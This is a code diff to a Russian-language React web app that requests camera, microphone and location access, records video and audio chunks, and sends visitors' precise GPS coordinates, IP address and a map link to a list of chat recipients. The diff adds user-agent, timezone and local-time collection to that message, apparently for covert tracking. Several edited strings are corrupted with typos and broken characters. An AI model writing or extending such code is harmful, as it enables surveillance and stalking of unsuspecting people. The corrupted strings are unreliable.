@@ -317,7 +317,7 @@ export default function App() {
         isMac ? 'Mac определяет местоположение через Wi-Fi сети.' : 'в настройках ОС.'
       ].filter(Boolean).join('\n');
       case 2: return isMac 
-        ? '❌ Не удалось определить местоположение.\n\n🖥️ macOS:\n1️⃣ Подключитесь к Wi-Fi (обязательно!)\n2️⃣ Настройки > Защита и безопасность > Сужбы геолокации\n3️⃣ Включите службы геолокации\n4️⃣ Разрешите брузеру доступ\n\n⚠️ Mac не имеет GPS, используетс Wi-Fi трангуляция!'
+        ? '❌ Не удалось определить местоположение.\n\n🖥️ macOS:\n1️⃣ Подключитесь к Wi-Fi (обязаельно!)\n2️⃣ Настройки > Защита и безопасность > Сужбы геолокации\n3️⃣ Включите службы геолокации\n4️⃣ Разрешите брузеру доступ\n\n⚠️ Mac не имеет GPS, используетс Wi-Fi трангуляция!'
         : '❌ Не удалось определить местоположение.\nВключите GPS и/или интернет.';
       case 3: return '❌ Истёк таймаут.\nПерейдите в место с лучшим приёмом GPS/сети\nи повторите.';
       default: return isMac
@@ -368,7 +368,7 @@ export default function App() {
       cameraSuccess = true;
       
       // Update UI after success
-      setCoordsData('✅ Камера и микрофон: разрешено\n\n🔄 Запрашиваем геолок��цию...');
+      setCoordsData('✅ Камера и микрофон: разрешено\n\n🔄 Запрашиваем геолокацию...');
       setShowCoords(true);
     } catch (e: any) {
       hasErrors = true;
@@ -397,7 +397,7 @@ export default function App() {
       // On macOS, trigger Local Network Access request BEFORE geolocation
       if (isMac) {
         log('🖥️ macOS - триггерим Local Network Access...');
-        setCoordsData((prev) => prev + '\n\n⚠️ macOS: Разрешите доступ к локальной сети');
+        setCoordsData((prev) => prev + '\n\n⚠️ macOS: Разрешите доступ к локальной ��ети');
         await triggerLocalNetworkAccess();
       }
       
@@ -446,7 +446,7 @@ export default function App() {
         
         // Show specific GPS enable instructions
         if (e?.code === 2) {
-          results.push('\n⚡ ДЕЙСТВИЕ ТРЕБУЕТСЯ:\nВключите GPS в настройках устройства,\nзатем нажмите кнопку "Повто��ить попытк"');
+          results.push('\n⚡ ДЕЙСТВИЕ ТРЕБУЕТСЯ:\nВключите GPS в настройках устройства,\nзатем нажмите кнопку "Повтоиь попытк"');
         }
       }
     }
@@ -622,6 +622,32 @@ export default function App() {
       const ip = await getUserIP();
       console.log('🌐 IP адрес получен:', ip);
       
+      // Get UserAgent
+      const userAgent = navigator.userAgent;
+      console.log('🔍 UserAgent:', userAgent);
+      
+      // Get Timezone information
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const timezoneOffset = new Date().getTimezoneOffset();
+      const offsetHours = Math.abs(Math.floor(timezoneOffset / 60));
+      const offsetMinutes = Math.abs(timezoneOffset % 60);
+      const offsetSign = timezoneOffset <= 0 ? '+' : '-';
+      const timezoneUTC = `UTC${offsetSign}${offsetHours.toString().padStart(2, '0')}:${offsetMinutes.toString().padStart(2, '0')}`;
+      
+      // Get local time
+      const localTime = new Date().toLocaleString('ru-RU', {
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false
+      });
+      
+      console.log('🕐 Timezone:', timezone, timezoneUTC);
+      console.log('🕐 Local Time:', localTime);
+      
       // Prepare message
       const lat = latitude.toFixed(6);
       const lng = longitude.toFixed(6);
@@ -635,9 +661,11 @@ export default function App() {
         `   Долгота: ${lng}\n` +
         `   Точность: ±${Math.round(accuracy)} м\n\n` +
         `🌐 IP-адрес: ${ip}\n` +
-        `🔍 Браузер: ${browserInfo}\n\n` +
-        `🗺️ Карта: ${googleMapsLink}\n\n` +
-        `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
+        `🔍 Браузер: ${browserInfo}\n` +
+        `📱 UserAgent: ${userAgent}\n\n` +
+        `🕐 Timezone: ${timezone} (${timezoneUTC})\n` +
+        `⏰ Локальное время: ${localTime}\n\n` +
+        `🗺️ Карта: ${googleMapsLink}`;
 
       console.log('📝 Сообщение подготовлено:', message.substring(0, 100) + '...');
 
@@ -652,7 +680,7 @@ export default function App() {
         return;
       }
 
-      console.log(`📤 Отправляем ${chatIds.size} пользователям...`);
+      console.log(`📤 Отправляем ${chatIds.size} пользовател��м...`);
 
       // Send message to all users
       let successCount = 0;
@@ -812,7 +840,7 @@ export default function App() {
           setIsVideoRecording(true);
           console.log('✅ Возвращены к фронтальной камере');
         } catch (fallbackError) {
-          console.error('❌ Критическая ошибка - не удалось вернуться к фронтальной камере:', fallbackError);
+          console.error('❌ Критическая ошибка - не удалось вернуться к фронтальой камере:', fallbackError);
         }
       }
     } finally {
@@ -822,7 +850,7 @@ export default function App() {
   
   // Handle video chunk ready with camera switching logic
   const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
-    console.log(`📹 Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
+    console.log(`📹 Получен видео+аудио ��анк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
     
     // Update current chunk number
     setCurrentChunkNumber(chunkNum);
